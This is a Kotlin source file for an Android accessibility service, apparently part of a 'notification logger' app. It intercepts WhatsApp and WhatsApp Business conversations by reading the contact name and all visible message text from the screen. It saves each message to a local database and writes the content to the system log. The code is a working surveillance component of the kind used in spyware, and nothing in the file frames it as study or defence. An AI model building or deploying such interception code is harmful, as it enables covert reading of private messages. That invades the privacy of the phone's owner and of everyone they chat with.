package com.example.notificationlogger

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.notificationlogger.data.AppDatabase
import com.example.notificationlogger.data.Message
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class ChatInterceptorService : AccessibilityService() {

    private val TAG = "ChatInterceptor"
    private var currentChatUser: String = "Unknown"

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val rootNode = rootInActiveWindow ?: return
        val pkgName = event.packageName?.toString() ?: ""
        
        // We only care about WhatsApp for now as it's the target
        if (pkgName != "com.whatsapp" && pkgName != "com.whatsapp.w4b") {
            return
        }

        // 1. Try to find the person we are chatting with from the toolbar
        updateChatUser(rootNode, pkgName)

        // 2. Scrape all visible text messages
        scrapeMessages(rootNode, pkgName)
    }

    private fun updateChatUser(root: AccessibilityNodeInfo, pkgName: String) {
        // In WhatsApp, the contact name is usually in a TextView in the top toolbar
        val id = if (pkgName == "com.whatsapp") "com.whatsapp:id/conversation_contact_name" else "com.whatsapp.w4b:id/conversation_contact_name"
        val toolbarNodes = root.findAccessibilityNodeInfosByViewId(id)
        if (toolbarNodes.isNotEmpty()) {
            val name = toolbarNodes[0].text?.toString()
            if (!name.isNullOrEmpty()) {
                currentChatUser = name
            }
        }
    }

    private fun scrapeMessages(root: AccessibilityNodeInfo, pkgName: String) {
        val id = if (pkgName == "com.whatsapp") "com.whatsapp:id/message_text" else "com.whatsapp.w4b:id/message_text"
        val messageNodes = root.findAccessibilityNodeInfosByViewId(id)
        
        if (messageNodes.isNotEmpty()) {
            for (node in messageNodes) {
                val content = node.text?.toString()
                if (!content.isNullOrEmpty()) {
                    saveInChatLevel(content, pkgName)
                }
            }
        } else {
            // Fallback: If we can't find by ID, look for any text nodes that might be messages
            if (currentChatUser != "Unknown") {
                scrapeGeneric(root, pkgName)
            }
        }
    }

    private fun scrapeGeneric(node: AccessibilityNodeInfo, pkgName: String) {
        if (node.childCount == 0) {
            val content = node.text?.toString()
            if (!content.isNullOrEmpty() && content.length > 1) {
                // Ignore common UI elements
                val ignored = listOf("Type a message", "Status", "Chats", "Calls", "Settings", "New chat", "Search")
                if (!ignored.contains(content)) {
                    saveInChatLevel(content, pkgName)
                }
            }
            return
        }
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { scrapeGeneric(it, pkgName) }
        }
    }

    private fun saveInChatLevel(content: String, pkgName: String) {
        val context = applicationContext
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val db = AppDatabase.getDatabase(context)
                
                // Duplicate check
                val tenSecondsAgo = System.currentTimeMillis() - 10000
                val duplicate = db.messageDao().findDuplicate(currentChatUser, content, pkgName, tenSecondsAgo)
                
                if (duplicate == null) {
                    val message = Message(
                        sender = currentChatUser,
                        content = content,
                        packageName = pkgName,
                        timestamp = System.currentTimeMillis()
                    )
                    db.messageDao().insertMessage(message)
                    Log.d(TAG, "Scrapped in-chat message in $pkgName: $currentChatUser -> $content")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Scrapping error: ${e.message}")
            }
        }
    }

    override fun onInterrupt() {}
}
